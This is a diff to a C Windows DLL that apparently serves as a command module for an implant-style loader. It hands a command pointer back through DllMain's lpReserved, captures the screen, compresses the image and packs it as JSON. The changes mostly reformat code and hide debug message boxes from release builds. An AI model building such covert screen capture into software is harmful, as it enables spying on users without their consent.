@@ -61,15 +61,21 @@ __declspec(dllexport) void TestGadget(char* args)
 }
 #endif
 
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
+{
+    #ifdef DEBUG
     MessageBox(NULL, "DLL Loaded!", "DLL Loaded!", MB_ICONINFORMATION);
-    switch (fdwReason) {
+    #endif
+    switch (fdwReason)
+    {
         case DLL_PROCESS_ATTACH:
             // DLL is being loaded
             if( lpReserved != NULL )
             {
+                #ifdef DEBUG
                 MessageBox(NULL, "Setting lpReserved!", "d", MB_ICONINFORMATION);
-				// *(HMODULE *)lpReserved = ShowMessageBox;
+                #endif
+                // *(HMODULE *)lpReserved = ShowMessageBox;
                 *(CommandNodePointer*)lpReserved = GetGadgetCommand;
             }
             break;
@@ -149,7 +155,8 @@ char* TakeScreenShot(char* args)
     bmpFileHeader.bfOffBits   = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
 
     // Allocate space for the bitmap file in memory
-    if ((bmpFile = calloc(1, bmpFileHeader.bfSize)) != NULL) {
+    if ((bmpFile = calloc(1, bmpFileHeader.bfSize)) != NULL)
+    {
         GetDIBits(hdc,                          // Handle to device context
                   hBitmap,                      // Handle to bitmap
                   0,                            // First scan line to retrieve
@@ -166,7 +173,7 @@ char* TakeScreenShot(char* args)
     unsigned long compressedSize;
     unsigned char* compressedData = CompressData((unsigned char*)bmpFile, (*(BITMAPFILEHEADER*)(bmpFile)).bfSize, &compressedSize);
 
-    if (bmpFile) {free(bmpFile); }
+    SAFE_FREE(bmpFile);
 
     DataBlobs *dbData = (DataBlobs*)malloc(sizeof(DataBlobs));
     dbData->buffers = NULL;
@@ -194,14 +201,16 @@ char* TakeScreenShot(char* args)
 
 // Convert DataBlobs struct to JSON string
 char* BlobsToJson(DataBlobs* data) {
-    if (!data) {
+    if (!data)
+    {
         return NULL;
     }
 
     cJSON* jsonData = cJSON_CreateObject();
     cJSON* jsonBuffers = cJSON_CreateArray();
 
-    for (int i = 0; i < data->count; ++i) {
+    for (int i = 0; i < data->count; ++i)
+    {
         cJSON* jsonBuffer = cJSON_CreateObject();
         cJSON_AddNumberToObject(jsonBuffer, "size", data->sizes[i]);
         
@@ -237,7 +246,8 @@ unsigned char* CompressData(unsigned char* data, unsigned long dataSize, unsigne
     uLongf destLen = compressBound(dataSize);
     unsigned char* compressedData = (unsigned char*)malloc(destLen);
 
-    if (compress(compressedData, &destLen, data, dataSize) != Z_OK) {
+    if (compress(compressedData, &destLen, data, dataSize) != Z_OK)
+    {
         free(compressedData);
         return NULL;
     }
